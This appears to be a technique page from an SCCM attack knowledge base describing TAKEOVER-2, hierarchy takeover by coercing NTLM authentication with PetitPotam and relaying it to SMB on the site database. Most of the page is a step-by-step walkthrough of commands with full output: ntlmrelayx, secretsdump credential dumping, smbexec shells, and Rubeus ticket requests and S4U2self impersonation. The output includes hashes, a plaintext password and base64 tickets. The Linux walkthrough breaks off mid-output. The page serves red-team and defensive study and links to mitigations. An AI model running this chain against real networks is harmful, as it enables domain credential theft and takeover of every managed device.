# TAKEOVER-2

## Description
Hierarchy takeover via NTLM coercion and relay to SMB on remote site database

## MITRE ATT&CK TTPs
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement

## Requirements

### Coercion
- Valid Active Directory domain credentials
- Connectivity to SMB (TCP/445) on a coercion target:
    - TAKEOVER-2.1: Coerce primary site server
    - TAKEOVER-2.2: Coerce passive site server
- Connectivity from the coercion target to SMB (TCP/445) on the relay server
- Coercion target settings:
    - `BlockNTLM` = `0` or not present, or = `1` and `BlockNTLMServerExceptionList` contains attacker relay server
    - `RestrictSendingNTLMTraffic` = `0`, `1`, or not present, or = `2` and `ClientAllowedNTLMServers` contains attacker relay server
    - Domain computer account is not in `Protected Users`
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target

### Relay
- Connectivity from the relay server to SMB (TCP/445) on the relay target, the site database
- Relay target settings:
    - `RequireSecuritySignature` = `0` or not present
    - `RestrictReceivingNTLMTraffic` = `0` or not present
    - Coercion target is local admin (to access RPC/admin shares)
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains relay target
    - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target


## Summary
By default, the Active Directory domain computer accounts for primary site servers (including CAS site servers) and passive site servers are granted membership in their respective site database server's local Administrators group. An attacker who is able to successfully coerce NTLM authentication from one of these accounts and relay it to the site database server via SMB can use these permissions to access the system and database, then grant an arbitrary domain account the SCCM "Full Administrator" role.

## Impact
The "Full Administrator" security role is granted all permissions in Configuration Manager for all scopes and all collections. An attacker with this privilege can execute arbitrary programs on any client device that is online as SYSTEM, the currently logged on user, or as a specific user when they next log on. They can also leverage tools such as CMPivot and Run Script to query or execute scripts on client devices in real-time using the AdminService or WMI on an SMS Provider.

## Defensive IDs
- [DETECT-1: Monitor site server domain computer accounts authenticating from another source](../../../defense-techniques/DETECT/DETECT-1/detect-1_description.md)
- [PREVENT-12: Require SMB signing on site systems](../../../defense-techniques/PREVENT/PREVENT-12/prevent-12_description.md)
- [PREVENT-20: Block unnecessary connections to site systems](../../../defense-techniques/PREVENT/PREVENT-20/prevent-20_description.md)

## Subtechniques
- TAKEOVER-2.1: Coerce primary site server
- TAKEOVER-2.2: Coerce passive site server

## Examples
The steps to execute TAKEOVER-2.1 and TAKEOVER-2.2 are the same except that a different system is targeted for coercion of NTLM authentication.

### Windows

1. On the attacker relay server, start `ntlmrelayx`, targeting the IP address of the site database server and starting a SOCKS proxy:

    ```
    └─# ntlmrelayx.py -t smb://10.10.100.8 -socks -smb2support
    Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra

    [*] Protocol Client SMB loaded..
    [*] Protocol Client IMAP loaded..
    [*] Protocol Client IMAPS loaded..
    [*] Protocol Client RPC loaded..
    [*] Protocol Client DCSYNC loaded..
    [*] Protocol Client MSSQL loaded..
    [*] Protocol Client LDAP loaded..
    [*] Protocol Client LDAPS loaded..
    [*] Protocol Client SMTP loaded..
    [*] Protocol Client HTTPS loaded..
    [*] Protocol Client HTTP loaded..
    [*] Running in relay mode to single host
    [*] SOCKS proxy started. Listening on 127.0.0.1:1080
    [*] SMTP Socks Plugin loaded..
    [*] IMAPS Socks Plugin loaded..
    [*] IMAP Socks Plugin loaded..
    [*] MSSQL Socks Plugin loaded..
    [*] HTTP Socks Plugin loaded..
    [*] HTTPS Socks Plugin loaded..
    [*] SMB Socks Plugin loaded..
    [*] Setting up SMB Server
    [*] Setting up HTTP Server on port 80
    * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
    * Debug mode: off
    [*] Setting up WCF Server
    [*] Setting up RAW Server on port 6666

    [*] Servers started, waiting for connections
    Type help for list of commands
    ntlmrelayx>
    ```

2. Coerce authentication from the site server's domain computer account:

    ```
    └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd 10.10.100.136 sccm.internal.lab
    Trying pipe lsarpc
    [-] Connecting to ncacn_np:sccm.internal.lab[\PIPE\lsarpc]
    [+] Connected!
    [+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
    [+] Successfully bound!
    [-] Sending EfsRpcOpenFileRaw!
    [-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
    [+] OK! Using unpatched function!
    [-] Sending EfsRpcEncryptFileSrv!
    [+] Got expected ERROR_BAD_NETPATH exception!!
    [+] Attack worked!
    ```

    Observe that a connection is received on the relay server and a SOCKS proxy the site database server is started with the relayed credentials:

    ```
    [*] Servers started, waiting for connections
    Type help for list of commands
    ntlmrelayx> [*] SMBD-Thread-9 (process_request_thread): Received connection from 10.10.100.9, attacking target smb://10.10.100.8
    [*] Authenticating against smb://10.10.100.8 as LAB/SCCM$ SUCCEED
    [*] SOCKS: Adding LAB/SCCM$@10.10.100.8(445) to active SOCKS connection. Enjoy
    [*] SMBD-Thread-10 (process_request_thread): Connection from 10.10.100.9 controlled, but there are no more targets left!
    socks
    Protocol  Target       Username   AdminStatus  Port
    --------  -----------  ---------  -----------  ----
    SMB       10.10.100.8  LAB/SCCM$  TRUE         445
    ntlmrelayx>
    ```

3. Proxy in secretsdump to obtain credentials for the MSSQL database, which may be running as `LocalSystem` or a domain service account:

    ```
    └─# proxychains secretsdump.py 'lab/sccm$@10.10.100.8' -no-pass
    [proxychains] config file found: /etc/proxychains4.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] DLL init: proxychains-ng 4.17
    Impacket v0.11.0 - Copyright 2023 Fortra

    Password:
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.57.31:445  ...  OK
    [*] Service RemoteRegistry is in stopped state
    [*] Starting service RemoteRegistry
    [*] Target system bootKey: 0xc572...b524
    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19c...ef42:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6...89c0:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6...089c0:::
    WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2b07...31bd:::
    [*] Dumping cached domain logon information (domain/username:hash)
    MAYYHEM.LOCAL/sccmadmin:$DCC2$10240#sccmadmin#9c5f...8b48: (2024-02-29 18:49:56)
    MAYYHEM.LOCAL/Administrator:$DCC2$10240#Administrator#dfb3...dc42: (2024-02-24 18:21:18)
    MAYYHEM.LOCAL/sqlsvc:$DCC2$10240#sqlsvc#e1286...346c: (2024-03-01 17:23:29)
    [*] Dumping LSA Secrets
    [*] $MACHINE.ACC
    MAYYHEM\SITE3-DB$:aes256-cts-hmac-sha1-96:0079...ba03
    MAYYHEM\SITE3-DB$:aes128-cts-hmac-sha1-96:2d8e...3068
    MAYYHEM\SITE3-DB$:des-cbc-md5:83f1...7ca4
    MAYYHEM\SITE3-DB$:plain_password_hex:6100...6d00
    MAYYHEM\SITE3-DB$:aad3b435b51404eeaad3b435b51404ee:1eca...baf0:::
    [*] DPAPI_SYSTEM 
    dpapi_machinekey:0xf470...4a44
    dpapi_userkey:0x09f0....7fcf
    [*] NL$KM 
    ...
    NL$KM:2978...b0c1
    [*] _SC_MSSQLSERVER 
    MAYYHEM\sqlsvc:P@ssw0rd
    [*] _SC_SQLSERVERAGENT 
    MAYYHEM\sqlsvc:P@ssw0rd
    [*] Cleaning up... 
    [*] Stopping service RemoteRegistry
    ```

4. Get a shell/agent on the system as SYSTEM:

    ```
    impacket-smbexec Administrator@SITE3-DB.MAYYHEM.LOCAL -hashes ad3b435b51404eeaad3b435b51404ee:e19c...ef42 
    Impacket v0.11.0 - Copyright 2023 Fortra

    [!] Launching semi-interactive shell - Careful what you execute
    C:\Windows\system32>
    ```

    At this point, if the service is running in the context of `LocalSystem`, you can access the database to grant a user the `Full Administrator` role (see TAKEOVER-1). If the database is running in the context of a domain service account, further steps are needed.

5. Identify the account running the sqlservr.exe service. In this example, the site database is running in the context of `MAYYHEM\sqlsvc`:

    ```
    tasklist /v

    Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title                                                            
    ========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================
    System Idle Process              0 Services                   0          8 K Unknown         NT AUTHORITY\SYSTEM                                     0:12:41 N/A                                                                     
    ...
    sqlservr.exe                  4776 Services                   0    253,152 K Unknown         MAYYHEM\sqlsvc                                          0:00:01 N/A                                                                     
    ...
    conhost.exe                   2980 Services                   0     12,976 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
    tasklist.exe                  4908 Services                   0      8,800 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A 
    ```

6. Get the SPN for the database service account:

    ```
    setspn -L sqlsvc
    Registered ServicePrincipalNames for CN=SQL Service,CN=Users,DC=MAYYHEM,DC=LOCAL:
            MSSQLSvc/SITE3-DB.MAYYHEM.LOCAL:1433
            MSSQLSvc/SITE3-DB:1433
    ```

    From another Windows system:

7. Get a TGT for the SQL service account running the site database:

    ```
    .\Rubeus.exe asktgt /domain:MAYYHEM.LOCAL /user:sqlsvc /password:P@ssw0rd /nowrap

    ______        _
    (_____ \      | |
    _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v2.3.0

    [*] Action: Ask TGT

    [*] Using rc4_hmac hash: E19CCF75EE54E06B06A5907AF13CEF42
    [*] Building AS-REQ (w/ preauth) for: 'MAYYHEM.LOCAL\sqlsvc'
    [*] Using domain controller: 192.168.57.100:88
    [+] TGT request successful!
    [*] base64(ticket.kirbi):

        doIFdDCCBXCgAwIBBaEDAgEWooIEiDCCBIRhggSAMIIEfKADAgEFoQ8bDU1BWVlIRU0uTE9DQUyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDU1BWVlIRU0uTE9DQUyjggQ+MIIEOqADAgESoQMCAQKiggQsBIIEKLdcg3OmG5/v47h/u/swmeirjidkQJ8ndXG8ENds+MKZLhiKqcT1Q8o37wuZupaj8UZPgIDcwGlXi1cYrnFfvnQvZ8/EWTgMMs9ajk3eDcmyOBINC3mqDy6Cwwfm4jPuuxJpGUVgfBz6j0jabjAXhP0xZfHeBWa+ABUROtQIeaJ5sNT8BJat1nMVi97vBiC9Rxh8JfKypGTqXrcuhaaBmWquTb5I/+2tYfP03Sb22ddfIIKf2dUSf9rjuof6ttlmjrWgtDB8dkGCZYXzghkVCNZ0Jesag2qILMoOBjIDx4I2ijk88iNQmBjOgwJuhRmKoRYZAV03damrWzdY6sWCKtRlMagvOdWwz0NsX3nyV7NR5HSuKXIQzgRWeBYXgHrbEQgB8ga6b2yCOR6cNMuncTRTpkt91tHy7eLBtCHtVeBSTQyxojgKyVvcP2qP++RquYxQ/eOCOIjtp/wSopcudCA447Bm62/JxV3+VMXBvMviPZg0i+rQEgNyfdkE6ZThVRw3hk2oeLij+tCLqN7CPZ5fvbg4Petr3HLtEX7OH0v0xcjBxPGAsgAEh4iarhvkOHDJXrgbvj+40M1Gd3xfiBPXvcp7Lek3ndseuGdUA8B0iy+4QKNVmbkZubJ2OJVhmWJX9WbufcW/nIgh5KTX2RjU4d7clCxc8Zv0ZsjumtSSZHfRKjw3jRUBfjXLAwslMYM7HwwZCpp/+GXZduG8VewugrrUO6DGj87vGohpttjYeCH3+EN/uOOt0Xtz8DbfREwb1OKpS4bstWdyAyzrJm0BLY0Dr0XgG7wcz1WTJ5DWr2h6jHlYsWo4FWNNpB7kmVVhZz18hf+mB75/bqXhgRR4ja4xkqYk0KOHnUijgHxq2SNPW+XIIElnz2+ret/MsWiwq1wQz1WJjfHETgwcc1uMVL33yvwa7zyXpxGu0jl7m38mhZcuV1tR7Zm96y+s+Qg38M4AHNh+peu/EC55/EKrDX4g1hHrKvqMGfaO7QL39yQnYM/S90xoUDTZ7cKXQnRBeZZBRKCs/gEr8OnAqCqzXK39CbfOmtxGk2gi2ThB58Ptor1sc0U6hxvbfJi4M15N87zL2tjgepRqNOpudWB8yPqjhzca+hP/bvvSn7ks4zgS8H/kqzfSFL3TKEJhifkjpT3fQCxg4PMeSmyBZjj9QpOMCapn1QiSTYmMEqDCF5PU0kwEgFrxtEc5W+aUNbr6GLtwgC7GID92oySq1dMDgLyEanX4wsY1SQO7LHK+Iurr1DTLk5Qhc8ZW6kl+XvgEOoib/Dekhje++nnHuXuimNRbFjllJ4m0N8AbMY/3D4HDc3TWbxcUg/8lid3LQe/Mr3cqAGJjBzIXqelfLRtv7O438ffE6phoNcY2u1EyFY75ObXsiIkRBpuhWhkhvQvu/lGiH1k1o4HXMIHUoAMCAQCigcwEgcl9gcYwgcOggcAwgb0wgbqgGzAZoAMCARehEgQQu39YMInwN6CIRKRoZgf7RKEPGw1NQVlZSEVNLkxPQ0FMohMwEaADAgEBoQowCBsGc3Fsc3ZjowcDBQBA4QAApREYDzIwMjQwMzA1MTA1MjI2WqYRGA8yMDI0MDMwNTIwNTIyNlqnERgPMjAyNDAzMTIxMDUyMjZaqA8bDU1BWVlIRU0uTE9DQUypIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDU1BWVlIRU0uTE9DQUw=

    ServiceName              :  krbtgt/MAYYHEM.LOCAL
    ServiceRealm             :  MAYYHEM.LOCAL
    UserName                 :  sqlsvc (NT_PRINCIPAL)
    UserRealm                :  MAYYHEM.LOCAL
    StartTime                :  3/5/2024 2:52:26 AM
    EndTime                  :  3/5/2024 12:52:26 PM
    RenewTill                :  3/12/2024 3:52:26 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  rc4_hmac
    Base64(key)              :  u39YMInwN6CIRKRoZgf7RA==
    ASREP (key)              :  E19CCF75EE54E06B06A5907AF13CEF42
    ```

8. Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the primary site server:

    ```
    Rubeus.exe s4u /impersonateuser:SITE-SERVER$ /altservice:MSSQLSvc/SITE3-DB.MAYYHEM.LOCAL:1433 /self /nowrap /ticket:doIFdDCCBXCgAwIBBaEDAgEWooIEiDCCBIRhggSAMIIEfKADAgEFoQ8bDU1BWVlIRU0uTE9DQUyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDU1BWVlIRU0uTE9DQUyjggQ+MIIEOqADAgESoQMCAQKiggQsBIIEKLdcg3OmG5/v47h/u/swmeirjidkQJ8ndXG8ENds+MKZLhiKqcT1Q8o37wuZupaj8UZPgIDcwGlXi1cYrnFfvnQvZ8/EWTgMMs9ajk3eDcmyOBINC3mqDy6Cwwfm4jPuuxJpGUVgfBz6j0jabjAXhP0xZfHeBWa+ABUROtQIeaJ5sNT8BJat1nMVi97vBiC9Rxh8JfKypGTqXrcuhaaBmWquTb5I/+2tYfP03Sb22ddfIIKf2dUSf9rjuof6ttlmjrWgtDB8dkGCZYXzghkVCNZ0Jesag2qILMoOBjIDx4I2ijk88iNQmBjOgwJuhRmKoRYZAV03damrWzdY6sWCKtRlMagvOdWwz0NsX3nyV7NR5HSuKXIQzgRWeBYXgHrbEQgB8ga6b2yCOR6cNMuncTRTpkt91tHy7eLBtCHtVeBSTQyxojgKyVvcP2qP++RquYxQ/eOCOIjtp/wSopcudCA447Bm62/JxV3+VMXBvMviPZg0i+rQEgNyfdkE6ZThVRw3hk2oeLij+tCLqN7CPZ5fvbg4Petr3HLtEX7OH0v0xcjBxPGAsgAEh4iarhvkOHDJXrgbvj+40M1Gd3xfiBPXvcp7Lek3ndseuGdUA8B0iy+4QKNVmbkZubJ2OJVhmWJX9WbufcW/nIgh5KTX2RjU4d7clCxc8Zv0ZsjumtSSZHfRKjw3jRUBfjXLAwslMYM7HwwZCpp/+GXZduG8VewugrrUO6DGj87vGohpttjYeCH3+EN/uOOt0Xtz8DbfREwb1OKpS4bstWdyAyzrJm0BLY0Dr0XgG7wcz1WTJ5DWr2h6jHlYsWo4FWNNpB7kmVVhZz18hf+mB75/bqXhgRR4ja4xkqYk0KOHnUijgHxq2SNPW+XIIElnz2+ret/MsWiwq1wQz1WJjfHETgwcc1uMVL33yvwa7zyXpxGu0jl7m38mhZcuV1tR7Zm96y+s+Qg38M4AHNh+peu/EC55/EKrDX4g1hHrKvqMGfaO7QL39yQnYM/S90xoUDTZ7cKXQnRBeZZBRKCs/gEr8OnAqCqzXK39CbfOmtxGk2gi2ThB58Ptor1sc0U6hxvbfJi4M15N87zL2tjgepRqNOpudWB8yPqjhzca+hP/bvvSn7ks4zgS8H/kqzfSFL3TKEJhifkjpT3fQCxg4PMeSmyBZjj9QpOMCapn1QiSTYmMEqDCF5PU0kwEgFrxtEc5W+aUNbr6GLtwgC7GID92oySq1dMDgLyEanX4wsY1SQO7LHK+Iurr1DTLk5Qhc8ZW6kl+XvgEOoib/Dekhje++nnHuXuimNRbFjllJ4m0N8AbMY/3D4HDc3TWbxcUg/8lid3LQe/Mr3cqAGJjBzIXqelfLRtv7O438ffE6phoNcY2u1EyFY75ObXsiIkRBpuhWhkhvQvu/lGiH1k1o4HXMIHUoAMCAQCigcwEgcl9gcYwgcOggcAwgb0wgbqgGzAZoAMCARehEgQQu39YMInwN6CIRKRoZgf7RKEPGw1NQVlZSEVNLkxPQ0FMohMwEaADAgEBoQowCBsGc3Fsc3ZjowcDBQBA4QAApREYDzIwMjQwMzA1MTA1MjI2WqYRGA8yMDI0MDMwNTIwNTIyNlqnERgPMjAyNDAzMTIxMDUyMjZaqA8bDU1BWVlIRU0uTE9DQUypIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDU1BWVlIRU0uTE9DQUw=

    ______        _
    (_____ \      | |
    _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v2.3.0

    [*] Action: S4U

    [*] Action: S4U

    [*] Building S4U2self request for: 'sqlsvc@MAYYHEM.LOCAL'
    [*] Using domain controller: DC.MAYYHEM.LOCAL (192.168.57.100)
    [*] Sending S4U2self request to 192.168.57.100:88
    [+] S4U2self success!
    [*] Substituting alternative service name 'MSSQLSvc/SITE3-DB.MAYYHEM.LOCAL:1433'
    [*] Got a TGS for 'SITE-SERVER$' to 'MSSQLSvc@MAYYHEM.LOCAL'
    [*] base64(ticket.kirbi):

        doIFnDCCBZigAwIBBaEDAgEWooIEmjCCBJZhggSSMIIEjqADAgEFoQ8bDU1BWVlIRU0uTE9DQUyiMjAwoAMCAQGhKTAnGwhNU1NRTFN2YxsbU0lURTMtREIuTUFZWUhFTS5MT0NBTDoxNDMzo4IEQDCCBDygAwIBF6EDAgECooIELgSCBCrQ0fgxcYKC86CoZYKnW00ZNLJRl2Vfn9hFIkkTwXzcRF7hyESIYvUkJqjtmm0butbj1+IxrfL9je7iAXV4i2peWLEMEZcVnCzNo88e/Wg/BSLiGYH3VMkn5+r43TlY8RWBZ4MD9yFFxkO/Bw7j7NSzL8itXIHOeEgAM/W2lv4SneurG8oKrp/yld9aTs1aRWXIghXYq8DqPz1s26TcXL4hkgsYDXp1vMTHsbM7SihTXIHjZw67EFZe4fJ4tT4fj2XLc3VSLFAtegHz/Pn1yVEJkcFmhHQv2JTr7bsjRLFr9vlUOW56dwocBnS4Iie8KrNSJ9vOCMXzpMTbFv+V8VxECsXNWyT6APsRFyK4FUegK5I0eQQVBDdsqYpahIBtDSA4UcJMTQxNyXvrsIZRYgnYzE+bDhEFoOKiAtTQaIvGUsTAcJjnqs1uQObE2dAORa3jbR/DQb/NVs3v48AF67NMSAdnR7Ff9H72tuw0Mhz3CNpnDy5s5XXQNnXHlkWyA4xyV3+dv3qcxEwvwtEppzKt6zpSO9d0Aohpl71zhuaV/APf9uavdKQ12I+Pd2xmuSoMaKpedl5odRX6sj2enpThmXYRMlwGh5g+wnnLBp321Y5WvrPE4gNtH4nTgG6f8T8W2joVSe0vZLgzaPlDhWOVsB1urd+hrLoZAAqnlvMxJS5Ph1z2iTRTjGfG41UudK/xiomFnJoTmpbtzXy+gNlXjI7mlPDqDFQfco690M/lSpm9zxTlLJihLDfSicRFB8LaB1Is4On6To5YELcGIFzTPsIcIIYXK+jJKTSLLhOueHLpsNzUWoq93PxbeR9MgUGVH9220DXl9dRnT7Eux3GQmVGj4UL4pIOHfGTYqvv9Xr3rlaHbCbTwB4QKT4lmz6Kf5Wq1rtBeh91lbNV4EwbboUXujbXK1dm7w1DHApeBgXRxWeYNgns0jQ6ZTj3GTQL8XOLhpBHPZeqnekIKrGnVZx4GmpmINNIs+7d8ytqVovx9wXJp4/5kqUWAFshf3dAAMKlH8OGUHzcpfpNzLviL+m53mmx0PPCWlBqpgArfABkcxjdyd3qPzmZzKCGCyk8c258tGRsDC0YD1yRKPQfntnQ+F71W1c9I/8aknUpN7W0x896/CBuDGIe88B9neO8XJwbAQgqMRJAzIqn5YjoFfNlbMt8QN4pVx6POJPbKP95Mctn+6Bgcx9lvksBDGxR1VBimFMcxqQtvJe+BgFGZzQKtSuz4onuuj8DnC/Nk9JvhQQP5805dV7JJq2URLWrwjpUrUtH41vKqu0n1Iyh8GB7czRogdjzeCPnQ1XTOdO2Kml9garo2CqVw5sZfWk3W2veaMmapw5og4Nv745nG/Xx2WXeNHK3MmJctl6hHLC90vn0948LuDlHq2X+M3kDYyY5fmNBivVPso4HtMIHqoAMCAQCigeIEgd99gdwwgdmggdYwgdMwgdCgGzAZoAMCARehEgQQoAiJugdRRTbS5gjvJ92UA6EPGw1NQVlZSEVNLkxPQ0FMohkwF6ADAgEKoRAwDhsMU0lURS1TRVJWRVIkowcDBQBAoQAApREYDzIwMjQwMzA1MTA1MjQ4WqYRGA8yMDI0MDMwNTIwNTIyNlqnERgPMjAyNDAzMTIxMDUyMjZaqA8bDU1BWVlIRU0uTE9DQUypMjAwoAMCAQGhKTAnGwhNU1NRTFN2YxsbU0lURTMtREIuTUFZWUhFTS5MT0NBTDoxNDMz
    ```

9. Start a sacrificial logon session for the Kerberos ticket:
    ```
    runas /netonly /user:asdf powershell
    Enter the password for asdf:
    Attempting to start powershell as user "CLIENT\asdf" ...
    ```

10. Import the ticket into the sacrificial logon session:

    ```
    Rubeus.exe ptt /ticket:doIFnDCCBZigAwIBBaEDAgEWooIEmjCCBJZhggSSMIIEjqADAgEFoQ8bDU1BWVlIRU0uTE9DQUyiMjAwoAMCAQGhKTAnGwhNU1NRTFN2YxsbU0lURTMtREIuTUFZWUhFTS5MT0NBTDoxNDMzo4IEQDCCBDygAwIBF6EDAgECooIELgSCBCrQ0fgxcYKC86CoZYKnW00ZNLJRl2Vfn9hFIkkTwXzcRF7hyESIYvUkJqjtmm0butbj1+IxrfL9je7iAXV4i2peWLEMEZcVnCzNo88e/Wg/BSLiGYH3VMkn5+r43TlY8RWBZ4MD9yFFxkO/Bw7j7NSzL8itXIHOeEgAM/W2lv4SneurG8oKrp/yld9aTs1aRWXIghXYq8DqPz1s26TcXL4hkgsYDXp1vMTHsbM7SihTXIHjZw67EFZe4fJ4tT4fj2XLc3VSLFAtegHz/Pn1yVEJkcFmhHQv2JTr7bsjRLFr9vlUOW56dwocBnS4Iie8KrNSJ9vOCMXzpMTbFv+V8VxECsXNWyT6APsRFyK4FUegK5I0eQQVBDdsqYpahIBtDSA4UcJMTQxNyXvrsIZRYgnYzE+bDhEFoOKiAtTQaIvGUsTAcJjnqs1uQObE2dAORa3jbR/DQb/NVs3v48AF67NMSAdnR7Ff9H72tuw0Mhz3CNpnDy5s5XXQNnXHlkWyA4xyV3+dv3qcxEwvwtEppzKt6zpSO9d0Aohpl71zhuaV/APf9uavdKQ12I+Pd2xmuSoMaKpedl5odRX6sj2enpThmXYRMlwGh5g+wnnLBp321Y5WvrPE4gNtH4nTgG6f8T8W2joVSe0vZLgzaPlDhWOVsB1urd+hrLoZAAqnlvMxJS5Ph1z2iTRTjGfG41UudK/xiomFnJoTmpbtzXy+gNlXjI7mlPDqDFQfco690M/lSpm9zxTlLJihLDfSicRFB8LaB1Is4On6To5YELcGIFzTPsIcIIYXK+jJKTSLLhOueHLpsNzUWoq93PxbeR9MgUGVH9220DXl9dRnT7Eux3GQmVGj4UL4pIOHfGTYqvv9Xr3rlaHbCbTwB4QKT4lmz6Kf5Wq1rtBeh91lbNV4EwbboUXujbXK1dm7w1DHApeBgXRxWeYNgns0jQ6ZTj3GTQL8XOLhpBHPZeqnekIKrGnVZx4GmpmINNIs+7d8ytqVovx9wXJp4/5kqUWAFshf3dAAMKlH8OGUHzcpfpNzLviL+m53mmx0PPCWlBqpgArfABkcxjdyd3qPzmZzKCGCyk8c258tGRsDC0YD1yRKPQfntnQ+F71W1c9I/8aknUpN7W0x896/CBuDGIe88B9neO8XJwbAQgqMRJAzIqn5YjoFfNlbMt8QN4pVx6POJPbKP95Mctn+6Bgcx9lvksBDGxR1VBimFMcxqQtvJe+BgFGZzQKtSuz4onuuj8DnC/Nk9JvhQQP5805dV7JJq2URLWrwjpUrUtH41vKqu0n1Iyh8GB7czRogdjzeCPnQ1XTOdO2Kml9garo2CqVw5sZfWk3W2veaMmapw5og4Nv745nG/Xx2WXeNHK3MmJctl6hHLC90vn0948LuDlHq2X+M3kDYyY5fmNBivVPso4HtMIHqoAMCAQCigeIEgd99gdwwgdmggdYwgdMwgdCgGzAZoAMCARehEgQQoAiJugdRRTbS5gjvJ92UA6EPGw1NQVlZSEVNLkxPQ0FMohkwF6ADAgEKoRAwDhsMU0lURS1TRVJWRVIkowcDBQBAoQAApREYDzIwMjQwMzA1MTA1MjQ4WqYRGA8yMDI0MDMwNTIwNTIyNlqnERgPMjAyNDAzMTIxMDUyMjZaqA8bDU1BWVlIRU0uTE9DQUypMjAwoAMCAQGhKTAnGwhNU1NRTFN2YxsbU0lURTMtREIuTUFZWUhFTS5MT0NBTDoxNDMz

    ______        _
    (_____ \      | |
    _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v2.3.0


    [*] Action: Import Ticket
    [+] Ticket successfully imported!
    ```

11. Launch SQL Server Management Studio, connect to the site database, and grant the "Full Administrator" role to an arbitrary account (see TAKEOVER-1):

    ```
    C:\Program Files (x86)\Microsoft SQL Server Management Studio 19\Common7\IDE\Ssms.exe
    ```

    Note that it may be possible to conduct this attack entirely from the site database server if the attacker can force the use of Kerberos authentication locally (e.g., using tradecraft similar to KrbRelayUp).

### Linux

1. Start `ntlmrelayx` with a SOCKS proxy
    ```
    └─# ntlmrelayx.py -t smb://10.10.100.8 -socks -smb2support
    Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra

    [*] Protocol Client SMB loaded..
    [*] Protocol Client IMAP loaded..
    [*] Protocol Client IMAPS loaded..
    [*] Protocol Client RPC loaded..
    [*] Protocol Client DCSYNC loaded..
    [*] Protocol Client MSSQL loaded..
    [*] Protocol Client LDAP loaded..
    [*] Protocol Client LDAPS loaded..
    [*] Protocol Client SMTP loaded..
    [*] Protocol Client HTTPS loaded..
    [*] Protocol Client HTTP loaded..
    [*] Running in relay mode to single host
    [*] SOCKS proxy started. Listening on 127.0.0.1:1080
    [*] SMTP Socks Plugin loaded..
    [*] IMAPS Socks Plugin loaded..
    [*] IMAP Socks Plugin loaded..
    [*] MSSQL Socks Plugin loaded..
    [*] HTTP Socks Plugin loaded..
    [*] HTTPS Socks Plugin loaded..
    [*] SMB Socks Plugin loaded..
    [*] Setting up SMB Server
    [*] Setting up HTTP Server on port 80
    * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
    * Debug mode: off
    [*] Setting up WCF Server
    [*] Setting up RAW Server on port 6666

    [*] Servers started, waiting for connections
    Type help for list of commands
    ntlmrelayx>
    ```

2. Coerce auth

    ```
    └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd 10.10.100.136 sccm.internal.lab
    Trying pipe lsarpc
    [-] Connecting to ncacn_np:sccm.internal.lab[\PIPE\lsarpc]
    [+] Connected!
    [+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
    [+] Successfully bound!
    [-] Sending EfsRpcOpenFileRaw!
    [-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
    [+] OK! Using unpatched function!
    [-] Sending EfsRpcEncryptFileSrv!
    [+] Got expected ERROR_BAD_NETPATH exception!!
    [+] Attack worked!
    ```

3. Receive connection on relay server

    ```
    [*] Servers started, waiting for connections
    Type help for list of commands
    ntlmrelayx> [*] SMBD-Thread-9 (process_request_thread): Received connection from 10.10.100.9, attacking target smb://10.10.100.8
    [*] Authenticating against smb://10.10.100.8 as LAB/SCCM$ SUCCEED
    [*] SOCKS: Adding LAB/SCCM$@10.10.100.8(445) to active SOCKS connection. Enjoy
    [*] SMBD-Thread-10 (process_request_thread): Connection from 10.10.100.9 controlled, but there are no more targets left!
    socks
    Protocol  Target       Username   AdminStatus  Port
    --------  -----------  ---------  -----------  ----
    SMB       10.10.100.8  LAB/SCCM$  TRUE         445
    ntlmrelayx>
    ```

4. Proxy in secretsdump
    ```
    └─# proxychains secretsdump.py 'lab/sccm$@10.10.100.8' -no-pass
    [proxychains] config file found: /etc/proxychains4.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.16
